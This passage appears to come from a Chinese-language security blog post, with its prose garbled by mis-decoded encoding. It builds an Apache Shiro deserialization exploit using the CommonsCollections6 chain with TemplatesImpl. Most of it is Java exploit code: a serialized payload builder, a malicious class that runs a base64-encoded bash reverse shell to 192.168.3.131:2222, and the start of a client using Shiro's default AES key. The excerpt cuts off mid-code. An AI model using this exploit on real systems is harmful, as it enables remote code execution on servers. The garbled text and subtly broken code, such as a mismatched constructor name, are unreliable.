&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‰é¢ç”¨åˆ°&lt;code>get&lt;/code>æ—¶æˆ‘ä»¬å¹¶ä¸å…³å¿ƒä¼ å…¥çš„keyï¼Œå› ä¸ºé‡ç‚¹åœ¨Transformeræ•°ç»„çš„ConstantTransformerï¼Œæˆ‘ä»¬é€šè¿‡å®ƒæ¥åˆå§‹åŒ–æ¶æ„å¯¹è±¡&lt;/p>
&lt;p>è€Œä»”ç»†çœ‹è¿™é‡Œçš„keyä¼šè¢«ä¼ å…¥&lt;code>transform&lt;/code>ï¼Œå®ƒå¯ä»¥æ‰®æ¼”ConstantTransformerçš„è§’è‰²&lt;/p>
&lt;p>å†å›žçœ‹Transformeræ•°ç»„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬äºŒè¡Œå¯ä»¥åŽ»æŽ‰ï¼Œæ•°ç»„é•¿åº¦å˜ä¸º1ï¼Œæ•°ç»„ä¹Ÿä¸éœ€è¦äº†&lt;/p>
&lt;p>ç¼–å†™ä¸€ä¸‹exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6Shiro&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">clsBytes&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">clsBytes&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">clear&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// åŒouterMap.clear()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ¶æ„ç±»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.DOM&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.TransletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.serializer.SerializationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6ShiroEvil&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">handlers&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">DTMAxisIterator&lt;/span> &lt;span style="color:#111">iterator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Evil&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello TemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ==}|{base64,-d}|{bash,-i}&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é€šè¿‡Client.javaè£…é…CC6Shiro&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.CtClass&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.crypto.AesCipherService&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.util.ByteSource&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6ShiroClient&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ysoserial&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">payloads&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">testCC6ShiroEvil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">testCC6Shiro&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AesCipherService&lt;/span> &lt;span style="color:#111">aes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AesCipherService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
